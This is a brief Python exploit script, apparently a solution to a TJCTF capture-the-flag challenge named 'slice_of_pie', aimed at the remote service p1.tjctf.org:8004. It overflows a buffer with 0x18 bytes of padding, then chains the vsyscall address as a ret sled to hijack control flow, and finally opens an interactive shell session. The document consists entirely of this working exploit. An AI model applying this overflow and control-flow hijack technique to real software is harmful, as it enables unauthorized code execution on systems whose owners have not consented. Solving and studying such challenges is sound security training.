from ptrlib import *

sock = Socket("p1.tjctf.org", 8004)
#sock = Process("./82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie")

vsyscall_ret = 0xffffffffff600000

payload = b'A' * 0x18
payload += p64(vsyscall_ret)
payload += p64(vsyscall_ret)

sock.recvuntil("Length: ")
sock.sendline(str(len(payload)))
sock.recvuntil("Input: ")
sock.sendline(payload)
sock.interactive()
